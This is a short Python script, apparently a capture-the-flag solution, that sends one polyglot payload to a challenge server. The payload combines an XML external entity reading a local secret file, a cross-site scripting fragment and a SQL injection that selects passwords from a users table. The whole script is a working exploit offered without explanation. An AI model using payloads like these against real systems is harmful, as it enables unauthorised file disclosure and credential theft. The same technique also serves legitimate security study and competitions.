import requests

URL = "https://payload.pwn2.win/"

if __name__ == "__main__" :
	payload = '''<!DOCTYPE root [<!ENTITY test SYSTEM "file:///home/gnx/script/xxe_secret"><!ENTITY x "<![CDATA[ < ]]>xss=1//" >]><root>&test;</root><!--' union select (select password from users),null,null#-->'''
	r = requests.post(URL,data={"payload":payload})

	print(r.text)
